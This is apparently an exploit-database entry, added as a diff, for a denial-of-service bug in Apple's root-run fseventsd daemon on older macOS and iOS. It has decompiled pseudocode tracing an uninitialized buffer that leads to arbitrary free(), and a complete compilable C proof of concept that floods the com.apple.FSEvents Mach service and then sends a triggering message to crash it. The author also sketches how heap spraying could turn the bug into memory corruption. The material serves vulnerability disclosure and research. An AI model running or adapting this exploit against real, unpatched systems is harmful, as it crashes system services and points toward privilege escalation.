@@ -1,0 +1,237 @@
+# Exploit Title: Apple macOS 10.15.1 - Denial of Service (PoC)
+# Date: 2019-11-02
+# Exploit Author: 08Tc3wBB
+# Vendor Homepage: Apple
+# Software Link:
+# Version: Apple macOS < 10.15.1 / iOS < 13.2
+# Tested on: Tested on macOS 10.14.6 and iOS 12.4.1
+# CVE : N/A
+# Type : DOS
+# https://support.apple.com/en-us/HT210721
+
+----- Execution file path:
+  /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/FSEvents.framework/Versions/A/Support/fseventsd
+
+fseventsd running as root and unsandboxed on both iOS and macOS, and accessible from within the Application sandbox.
+
+----- Analysis
+
+Env: macOS 10.14.6
+I named following pseudocode functions to help you understand the execution flow.
+
+void __fastcall routine_1(mach_msg_header_t *msg, mach_msg_header_t *reply) // 0x100001285
+{
+  ...
+  v9 = implementation_register_rpc(
+         msg->msgh_local_port,
+         msg[1].msgh_size,
+         msg[4].msgh_reserved,               
+         (unsigned int)msg[4].msgh_id,
+         *(_QWORD *)&msg[1].msgh_reserved,      // input_mem1
+         msg[2].msgh_size >> 2,                 // input_mem1_len
+         *(_QWORD *)&msg[2].msgh_remote_port,   // input_mem2
+         msg[2].msgh_id,                        // input_mem2_len
+         msg[5].msgh_remote_port,
+         *(_QWORD *)&msg[3].msgh_bits,          // input_mem3
+         msg[3].msgh_local_port >> 2,           // input_mem3_len
+         *(_QWORD *)&msg[3].msgh_reserved,      // input_mem4
+         msg[4].msgh_size);                     // input_mem4_len
+  ...
+}
+routine_1 will be executed when user send mach_msg to Mach Service "com.apple.FSEvents" with id 0x101D0
+
+And routine_1 internally invokes a function called fsevent_add_client to process data included in input_mem1/input_mem2
+
+I marked five places with: (1) (2) (3) (4) (5)
+These are the essential points cause this vulnerability.
+
+void *fsevent_add_client(...)
+{
+  ...
+  v25 = malloc(8LL * input_mem1_len); // (1) Allocate a new buffer with input_mem1_len, didn't initializing its content.
+  *(_QWORD *)(eventobj + 136) = v25; // Subsequently insert that new buffer into (eventobj + 136)
+  ...
+
+  v20 = ... // v20 point to an array of strings that was created based on user input
+
+  // The following process is doing recursive parsing to v20
+
+  index = 0LL;
+  while ( 1 )
+  {
+    v26 = *(const char **)(v20 + 8 * index);
+   
+    ...
+
+    v28 = strstr(*(const char **)(v20 + 8 * index), "/.docid");
+    v27 = v26;
+    if ( !v28 ) // (2) If input string doesn't contain "/.docid", stop further parse, go straight to strdup
+      goto LABEL_15;
+
+    if ( strcmp(v28, "/.docid") ) // (3) If an input string doesn't exactly match "/.docid", goto LABEL_16
+      goto LABEL_16;
+
+    *(_QWORD *)(*(_QWORD *)(eventobj + 136) + 8 * index) = strdup(".docid");
+
+LABEL_17:
+    if ( ++index >= input_mem1_len )
+      goto LABEL_21;
+  }
+
+  v27 = *(const char **)(v20 + 8 * index);
+LABEL_15:
+  *(_QWORD *)(*(_QWORD *)(eventobj + 136) + 8 * index) = strdup(v27);
+
+
+LABEL_16:
+  if ( *(_QWORD *)(*(_QWORD *)(eventobj + 136) + 8 * index) )
+    goto LABEL_17; // (4) So far the new buffer has never been initialized, but if it contain any wild value, it will goto LABEL_17, which program will retain that wild value and go on to parse next input_string
+  ...
+
+
+  // (5) Since all values saved in the new buffer supposed to be the return value of strdup, they will all be free'd later on. So if spray works successfully, the attacker can now has the ability to call free() on any address, further develop it to modify existing memory data.
+}
+
+However there is a catch, fseventsd only allow input_mem1_len be 1 unless the requested proc has root privilege, led to the size of uninitialized buffer can only be 8, such small size caused it very volatile, hard to apply desired spray work unless discover something else to assist. Or exploit another system proc (sandboxed it's okay), and borrow their root credential to send the exploit msg.
+
+----- PoC
+
+// clang poc.c -framework CoreFoundation -o poc
+
+#include <stdio.h>
+#include <xpc/xpc.h>
+#include <CoreFoundation/CoreFoundation.h>
+#include <bootstrap.h>
+
+mach_port_t server_port = 0;
+mach_port_t get_server_port(){
+    if(server_port)
+        return server_port;
+    bootstrap_look_up(bootstrap_port, "com.apple.FSEvents", &server_port);
+    return server_port;
+}
+
+int trigger_bug = 0;
+int has_reach_limit = 0;
+uint32_t call_routine_1(){
+   
+    struct SEND_Msg{
+        mach_msg_header_t Head;
+        mach_msg_body_t msgh_body;
+        mach_msg_port_descriptor_t port;
+        mach_msg_ool_descriptor_t mem1;
+        mach_msg_ool_descriptor_t mem2;
+        mach_msg_ool_descriptor_t mem3;
+        mach_msg_ool_descriptor_t mem4;
+        // Offset to here : +104
+       
+        uint64_t unused_field1;
+        uint32_t input_num1; // +112
+        uint32_t input_num2; // +116
+        uint64_t len_auth1; // +120 length of mem1/mem2
+        uint32_t input_num3; // +128
+        uint64_t len_auth2; // +132 length of mem3/mem4
+       
+        char unused_field[20];
+    };
+   
+    struct RECV_Msg{
+        mach_msg_header_t Head; // Size: 24
+        mach_msg_body_t msgh_body;
+        mach_msg_port_descriptor_t port;
+        uint64_t NDR_record;
+    };
+   
+    struct SEND_Msg *msg = malloc(0x100);
+    bzero(msg, 0x100);
+   
+    msg->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
+    msg->Head.msgh_size = 160;
+    int kkk = get_server_port();
+    msg->Head.msgh_remote_port = kkk;
+    msg->Head.msgh_local_port = mig_get_reply_port();
+    msg->Head.msgh_id = 0x101D0;
+    msg->msgh_body.msgh_descriptor_count = 5;
+   
+    msg->port.type = MACH_MSG_PORT_DESCRIPTOR;
+    msg->mem1.deallocate = false;
+    msg->mem1.copy = MACH_MSG_VIRTUAL_COPY;
+    msg->mem1.type = MACH_MSG_OOL_DESCRIPTOR;
+    memcpy(&msg->mem2, &msg->mem1, sizeof(msg->mem1));
+    memcpy(&msg->mem3, &msg->mem1, sizeof(msg->mem1));
+    memcpy(&msg->mem4, &msg->mem1, sizeof(msg->mem1));
+   
+    mach_port_t port1=0;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port1);
+   
+    msg->port.name = port1;
+    msg->port.disposition = MACH_MSG_TYPE_MAKE_SEND;
+   
+    uint64_t empty_data = 0;
+    if(trigger_bug){
+       
+        msg->input_num1 = 5;
+       
+        msg->mem1.address = &empty_data;
+        msg->mem1.size = 4;
+        msg->input_num2 = msg->mem1.size >> 2; // input_mem1_len_auth
+       
+        msg->mem2.address = "/.docid1";
+        msg->mem2.size = (mach_msg_size_t)strlen(msg->mem2.address) + 1;
+    }
+    else{
+        msg->input_num1 = 1;
+       
+        msg->mem1.address = &empty_data;
+        msg->mem1.size = 4;
+        msg->input_num2 = msg->mem1.size >> 2; // input_mem1_len_auth
+       
+        msg->mem2.address = "/.dacid1";
+        msg->mem2.size = (mach_msg_size_t)strlen(msg->mem2.address) + 1;
+    }
+   
+    msg->mem3.address = 0;
+    msg->mem3.size = 0;
+    msg->input_num3 = msg->mem3.size >> 2; // input_mem3_len_auth
+   
+    msg->mem4.address = 0;
+    msg->mem4.size = 0;
+   
+    msg->len_auth1 = ((uint64_t)msg->mem2.size << 32) | (msg->mem1.size >> 2);
+    msg->len_auth2 = ((uint64_t)msg->mem4.size << 32) | (msg->mem3.size >> 2);
+   
+    mach_msg((mach_msg_header_t*)msg, MACH_SEND_MSG|(trigger_bug?0:MACH_RCV_MSG), msg->Head.msgh_size, 0x100, msg->Head.msgh_local_port, 0, 0);
+   
+    int32_t errCode = *(int32_t*)(((char*)msg) + 0x20);
+    if(errCode == -21){
+        has_reach_limit = 1;
+    }
+   
+    mig_dealloc_reply_port(msg->Head.msgh_local_port);
+    struct RECV_Msg *recv_msg = (void*)msg;
+   
+    uint32_t return_port = recv_msg->port.name;
+    free(msg);
+   
+    return return_port;
+}
+
+int main(int argc, const char * argv[]) {
+  
+    printf("PoC started running...\n");
+   
+    uint32_t aaa[1000];
+    for(int i=0; i<=1000; i++){
+        if(has_reach_limit){
+            trigger_bug = 1;
+            call_routine_1();
+            break;
+        }
+        aaa[i] = call_routine_1();
+    }
+   
+    printf("Finished\n");
+    printf("Check crash file beneath /Library/Logs/DiagnosticReports/\n");
+   
+    return 0;
+}
